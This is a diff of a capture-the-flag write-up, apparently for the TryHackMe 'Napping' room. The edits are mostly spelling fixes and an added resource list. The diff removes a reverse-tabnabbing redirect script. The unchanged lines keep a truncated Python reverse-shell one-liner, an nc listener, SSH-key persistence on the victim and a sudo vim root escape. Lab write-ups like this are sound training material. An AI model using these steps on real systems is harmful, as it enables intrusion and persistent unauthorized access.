@@ -75,15 +75,7 @@ Take the source page of the login form
 ```
 
 # Wireshark
-Using Wireshark we can easy see the username and password of the user.
-
-<html>
- <body>
-  <script>
-  window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
-  </script>
- </body>
-</html>
+Using Wireshark, we can easily see the username and password of the user.
 
 ![Pasted image 20240617150919](https://github.com/BGhoster/Write-Ups/assets/43526966/5add2574-50c4-462a-9e36-9e0d9ff69a3c)
 
@@ -100,7 +92,7 @@ id
 ```
 
 
-### Finding files with group admin priveldges
+### Finding files with group admin privileges
 ```bash
 find / -group administrators -type f 2>/dev/null
 ```
@@ -110,7 +102,7 @@ or
 ![Pasted image 20240617152236](https://github.com/BGhoster/Write-Ups/assets/43526966/549e6b64-4711-4f92-bf9a-46eb838f5fc5)
 
 ## Getting reverse shell
-Add reverse shell to query.py and wait for shell. We can change this file because we are part of the administrator group.
+Add reverse shell to query.py and wait for the shell. We can change this file because we are part of the administrator group.
 ![Pasted image 20240617153532](https://github.com/BGhoster/Write-Ups/assets/43526966/00ce065d-8511-4676-a5a8-ac9f9228c188)
 
 ```python
@@ -120,8 +112,8 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 rlwrap nc -lvnp 7777
 ```
 
-## Upgrading to ssh connection
-On your attackers machine enter the following commands to get ssh on victims machine
+## Upgrading to SSH connection
+On your attacker machine, enter the following commands to get SSH on victim machine
 ```bash
 ssh-keygen -t rsa
 ```
@@ -132,7 +124,7 @@ cd .ssh
 cat id_rsa.pub
 ```
 
-On the victims machine enter these commands into authorized_keys
+On the victim's machine, enter these commands into authorized_keys
 ```bash
 cd .ssh
 ```
@@ -161,3 +153,8 @@ sudo vim -c ':!/bin/sh'
 cd /root; cat root.txt
 ```
 	THM{REMOVED}
+
+
+Resources
+https://www.linkedin.com/pulse/writeup-napping-tryhackmethm-medium-vojt%25C4%259Bch-tr%25C4%258Dka-mjmbf/
+https://owasp.org/www-community/attacks/Reverse_Tabnabbing
